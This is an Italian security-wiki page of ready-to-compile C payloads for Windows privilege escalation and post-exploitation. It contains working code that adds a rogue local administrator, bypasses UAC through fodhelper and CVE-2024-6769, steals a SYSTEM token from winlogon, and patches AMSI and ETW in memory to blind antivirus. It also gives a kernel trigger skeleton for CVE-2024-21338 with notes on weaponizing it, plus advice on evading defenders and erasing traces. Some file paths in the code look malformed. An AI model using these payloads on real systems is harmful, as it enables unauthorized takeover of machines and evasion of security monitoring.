# Payload in C per Windows

{{#include ../../banners/hacktricks-training.md}}

Questa pagina raccoglie **piccoli snippet in C autonomi** che sono utili durante Windows Local Privilege Escalation o post-exploitation. Ogni payload è progettato per essere facilmente copiato e incollato, richiede solo Windows API / C runtime e può essere compilato con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Questi payload presuppongono che il processo abbia già i privilegi minimi necessari per eseguire l'azione (es. `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity context for a UAC bypass). Sono pensati per ambienti **red-team o CTF** in cui lo sfruttamento di una vulnerabilità ha portato all'esecuzione arbitraria di codice nativo.

---

## Aggiungi utente amministratore locale
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Quando il binario attendibile **`fodhelper.exe`** viene eseguito, interroga il percorso del registro sottostante **senza filtrare il verbo `DelegateExecute`**. Piantando il nostro comando sotto quella chiave un attacker può bypassare UAC *senza* scrivere un file su disco.

*Percorso del registro interrogato da `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Una PoC minima che apre un `cmd.exe` elevato:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testato su Windows 10 22H2 e Windows 11 23H2 (patch di luglio 2025). Il bypass funziona ancora perché Microsoft non ha corretto il controllo di integrità mancante nel percorso `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning funziona ancora contro build Windows 10/11 patched perché `ctfmon.exe` viene eseguito come processo UI trusted ad alta integrità che carica volentieri dal drive `C:` impersonato del chiamante e riusa qualunque redirezione di DLL che `CSRSS` ha in cache. L'abuso procede così: punta `C:` verso uno storage controllato dall'attaccante, deposita un `msctf.dll` trojanizzato, avvia `ctfmon.exe` per ottenere alta integrità, poi chiedi a `CSRSS` di mettere in cache un manifest che reindirizza una DLL usata da un binario auto-elevato (es., `fodhelper.exe`) in modo che il successivo avvio erediti il tuo payload senza prompt UAC.

Practical workflow:
1. Prepara un albero finto `%SystemRoot%\System32` e copia il binario legittimo che intendi hijackare (spesso `ctfmon.exe`).
2. Usa `DefineDosDevice(DDD_RAW_TARGET_PATH)` per rimappare `C:` all'interno del tuo processo, mantenendo `DDD_NO_BROADCAST_SYSTEM` in modo che la modifica rimanga locale.
3. Deposita la tua DLL + manifest nell'albero finto, chiama `CreateActCtx/ActivateActCtx` per inserire il manifest nella cache dell'activation context, poi avvia il binario auto-elevato così che risolva la DLL reindirizzata direttamente nel tuo shellcode.
4. Elimina la voce della cache (`sxstrace ClearCache`) o riavvia al termine per cancellare le impronte dell'attaccante.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Consiglio di pulizia: dopo aver ottenuto SYSTEM, esegui `sxstrace Trace -logfile %TEMP%\sxstrace.etl` seguito da `sxstrace Parse` durante i test — se vedi il nome del tuo manifest nel log, anche i difensori possono vederlo, quindi ruota i percorsi a ogni esecuzione.

---

## Avviare una shell SYSTEM tramite duplicazione del token (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Se il processo corrente possiede **entrambi** i privilegi `SeDebug` e `SeImpersonate` (tipico di molti account di servizio), puoi rubare il token da `winlogon.exe`, duplicarlo e avviare un processo con privilegi elevati:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Per una spiegazione più approfondita di come funziona, vedi:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
La maggior parte dei moderni motori AV/EDR si basa su **AMSI** e **ETW** per ispezionare comportamenti malevoli. Applicare patch a entrambe le interfacce precocemente all'interno del processo corrente impedisce che script-based payloads (es. PowerShell, JScript) vengano scansionati.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*La patch sopra è locale al processo; avviare una nuova PowerShell dopo averla eseguita farà sì che venga eseguita senza l'ispezione AMSI/ETW.*

---

## Create child as Protected Process Light (PPL)
Richiedi un livello di protezione PPL per un processo figlio al momento della creazione usando `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Questa è un'API documentata e avrà successo solo se l'immagine target è firmata per la classe di firmatario richiesta (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Livelli usati più comunemente:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valida il risultato con Process Explorer/Process Hacker controllando la colonna Protection.

---

## Local Service -> Kernel tramite `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` espone un oggetto device (`\\.\\AppID`) il cui IOCTL di manutenzione dello smart-hash accetta puntatori a funzione forniti dall'utente ogni volta che il chiamante è in esecuzione come `LOCAL SERVICE`; Lazarus sta abusando di questo per disabilitare PPL e caricare driver arbitrari, quindi i red teams dovrebbero avere un trigger pronto per uso in laboratorio.

Note operative:
- Hai comunque bisogno di un token `LOCAL SERVICE`. Ruba il token da `Schedule` o `WdiServiceHost` usando `SeImpersonatePrivilege`, poi impersona prima di toccare il device in modo che i controlli ACL passino.
- IOCTL `0x22A018` si aspetta una struct contenente due puntatori a callback (query length + read function). Punta entrambi a stub in user-mode che costruiscono un token overwrite o mappano primitive ring-0, ma mantieni i buffer RWX in modo che KernelPatchGuard non vada in crash a metà catena.
- Dopo il successo, esci dall'impersonificazione e annulla il handle del device; i difensori ora cercano handle inattesi `Device\\AppID`, quindi chiudilo immediatamente una volta ottenuto il privilegio.

<details>
<summary>C - Scheletro di trigger per l'abuso dello smart-hash di `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Sistemazione minima per una build weaponizzata: mappa una sezione RWX con `VirtualAlloc`, copia lì il tuo token duplication stub, imposta `KernelThunk = section`, e una volta che `DeviceIoControl` ritorna dovresti essere SYSTEM anche sotto PPL.

---

## Riferimenti
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
